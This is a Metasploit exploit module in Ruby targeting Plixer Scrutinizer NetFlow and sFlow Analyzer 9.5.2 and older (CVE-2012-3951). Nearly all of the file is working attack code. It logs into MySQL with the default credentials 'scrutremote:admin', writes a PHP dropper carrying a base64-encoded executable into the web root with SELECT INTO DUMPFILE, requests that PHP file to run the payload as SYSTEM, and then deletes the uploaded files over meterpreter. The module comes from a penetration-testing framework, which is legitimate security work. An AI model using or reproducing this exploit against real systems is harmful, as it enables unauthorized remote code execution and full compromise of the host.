##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::MYSQL
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::EXE
 
    def initialize(info={})
        super(update_info(info,
            'Name'           => "Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential",
            'Description'    => %q{
                This exploits an insecure config found in Scrutinizer NetFlow & sFlow Analyzer.
                By default, the software installs a default password in MySQL, and binds the
                service to "0.0.0.0".  This allows any remote user to login to MySQL, and then
                gain arbitrary remote code execution under the context of 'SYSTEM'.  Examples
                of default credentials include: 'scrutinizer:admin', and 'scrutremote:admin'.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'Mario Ceballos',
                    'Jonathan Claudius',
                    'Tanya Secker',
                    'sinn3r'
                ],
            'References'     =>
                [
                    ['CVE', '2012-3951'],
                    ['OSVDB', '84317'],
                    ['URL', 'http://secunia.com/advisories/50074/'],
                    ['URL', 'https://www.trustwave.com/spiderlabs/advisories/TWSL2012-014.txt']
                ],
            'Payload'        =>
                {
                    'BadChars' => "\x00"
                },
            'DefaultOptions'  =>
                {
                    'InitialAutoRunScript' => 'migrate -f'
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    ['Scrutinizer NetFlow and sFlow Analyzer 9.5.2 or older', {}]
                ],
            'Privileged'     => false,
            'DisclosureDate' => "Jul 27 2012",
            'DefaultTarget'  => 0))
 
        register_options(
            [
                OptString.new("USERNAME",  [true, 'The default MySQL username', 'scrutremote']),
                OptString.new("PASSWORD",  [true, 'The default MySQL password', 'admin']),
                OptPort.new("MYSQLPORT",   [true, 'The MySQL\'s remote port', 3306]),
                OptPort.new("HTTPPORT",    [true, 'The HTTP Server\'s remote port', 80]),
                OptString.new("TARGETURI", [true, 'The web application\'s base path', '/'])
            ], self.class)
 
        # Both MySQL and HTTP need to use this, we'll have to register on the fly.
        deregister_options('RPORT')
    end
 
 
    def check
        tmp_rport = datastore['RPORT']
        datastore['RPORT'] = datastore['HTTPPORT']
        res = send_request_raw({'uri'=>target_uri.host})
        datastore['RPORT'] = tmp_rport
        if res and res.body =~ /\<title\>Scrutinizer\<\/title\>/ and
            res.body =~ /\<div id\=\'.+\'\>Scrutinizer 9\.[0-5]\.[0-2]\<\/div\>/
            return Exploit::CheckCode::Vulnerable
        end
 
        return Exploit::CheckCode::Safe
    end
 
 
    def get_php_payload(fname)
        p = Rex::Text.encode_base64(generate_payload_exe)
        php = %Q|
        <?php
        $f = fopen("#{fname}", "wb");
        fwrite($f, base64_decode("#{p}"));
        fclose($f);
        exec("#{fname}");
        ?>
        |
        php = php.gsub(/^\t\t/, '').gsub(/\n/, ' ')
        return php
    end
 
 
    #
    # I wanna be able to choose my own destination... path!
    #
    def mysql_upload_binary(bindata, path)
        # Modify the rport so we can use MySQL
        datastore['RPORT'] = datastore['MYSQLPORT']
 
        # Login
        h = mysql_login(datastore['USERNAME'], datastore['PASSWORD'])
 
        # The lib throws its own error message anyway:
        # "Exploit failed [no-access]: RbMysql::AccessDeniedError"
        return false if not h
 
        tmp = mysql_get_temp_dir
        p = bindata.unpack("H*")[0]
        dest = tmp + path
        mysql_query("SELECT 0x#{p} into DUMPFILE '#{dest}'")
        return true
    end
 
 
    def exe_php(php_fname)
        # Modify the rport so we can use HTTP
        datastore['RPORT'] = datastore['HTTPPORT']
 
        # Request our payload
        path = File.dirname("#{target_uri.path}/.")
        res = send_request_raw({'uri'=>"#{path}#{php_fname}"})
        return (res and res.code == 200)
    end
 
 
    def cleanup
        datastore['RPORT'] = @original_rport
    end
 
 
    def on_new_session(cli)
        if cli.type != 'meterpreter'
            print_error("Please remember to manually remove #{@exe_fname} and #{@php_fname}")
            return
        end
 
        cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
 
        begin
            print_status("Deleting #{@php_fname}")
            cli.fs.file.rm(@php_fname)
        rescue ::Exception => e
            print_error("Please note: #{@php_fname} is stil on disk.")
        end
 
        begin
            print_status("Deleting #{@exe_fname}")
            cli.fs.file.rm(@exe_fname)
        rescue ::Exception => e
            print_error("Please note: #{@exe_fname} is still on disk.")
        end
    end
 
 
    def exploit
        @original_rport = datastore['RPORT']
 
        #
        # Prepare our payload (naughty exe embedded in php)
        #
        @exe_fname = Rex::Text.rand_text_alpha(6) + '.exe'
        p = get_php_payload(@exe_fname)
 
        #
        # Upload our payload to the html directory
        #
        print_status("Uploading #{p.length.to_s} bytes via MySQL...")
        @php_fname = Rex::Text.rand_text_alpha(5) + '.php'
        if not mysql_upload_binary(p, "../../html/#{@php_fname}")
            print_error("That MySQL upload didn't work.")
            return
        end
 
        #
        # Execute the payload
        #
        print_status("Requesting #{@php_fname}...")
        res = exe_php(@php_fname)
 
        handler
    end
